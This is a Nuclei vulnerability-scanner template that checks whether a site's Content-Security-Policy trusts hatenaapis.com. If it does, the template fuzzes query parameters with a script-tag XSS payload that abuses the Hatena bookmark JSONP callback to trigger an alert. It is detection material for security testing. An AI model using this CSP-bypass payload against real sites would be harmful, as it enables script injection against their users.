flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - hatenaapis_bookmark_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://bookmark.hatenaapis.com/count/entry?url=x&callback=alert"></script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: hatenaapis_bookmark_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - hatenaapis.com
  method: GET
  path:
  - '{{BaseURL}}'
id: hatenaapis-bookmark-csp-bypass
info:
  author: renniepak,DhiyaneshDK
  metadata:
    verified: true
  name: Content-Security-Policy Bypass - Hatena APIs Bookmark
  reference:
  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
  severity: medium
  tags: xss,csp-bypass,hatenaapis-bookmark,vuln
